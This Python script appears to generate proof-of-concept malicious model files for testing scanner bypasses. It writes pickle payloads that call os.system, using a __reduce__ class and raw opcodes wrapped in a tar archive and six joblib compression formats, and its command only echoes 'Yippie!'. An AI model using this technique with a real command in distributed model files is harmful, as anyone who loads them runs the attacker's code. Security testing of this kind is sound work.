import joblib
import torch
import tarfile
import io

ROOT = "./models/malicious/path_bypass/path_bypass/"

# craft the exploit class
class Yippie():
    def __reduce__(self):
        import os; return (os.system, ('echo "Yippie!"',))

# tar -> pkl
print("Test PyTorch TAR...")
storages = b"cos\nsystem\nVecho 'Yippie!'\n\x85R0I0\n.]." 
tensors = b"cos\nsystem\nVecho 'Yippie!'\n\x85R0I0\n."
pickle_code = b"cos\nsystem\nVecho 'Yippie!'\n\x85R0I0\n."
payloads = {"storages": storages, "pickle": pickle_code, "tensors": tensors}

with tarfile.open(f"{ROOT}/tar2pickle.tar", "w") as tar:
    for name, data in payloads.items():
        # Create a TarInfo object (the Header)
        info = tarfile.TarInfo(name=name)
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
try:
    torch.load(f'{ROOT}/tar2pickle.tar', weights_only=False)
except Exception as e: print(f"No Yippie for tar2pickle due to {e}.")

# gz/zlib/bz2/lzma/xz/lz4 -> pkl
print("Test Joblib...")
for compression in ['zlib', 'lz4', 'lzma', 'bz2', 'xz', 'gzip']:
    joblib.dump(Yippie(), f'{ROOT}/{compression}2pickle.joblib', compress=(compression, 4))
    try: joblib.load(f'{ROOT}/{compression}2pickle.joblib')
    except Exception as e: print(f"No Yippie for {compression}2pickle due to {e}.")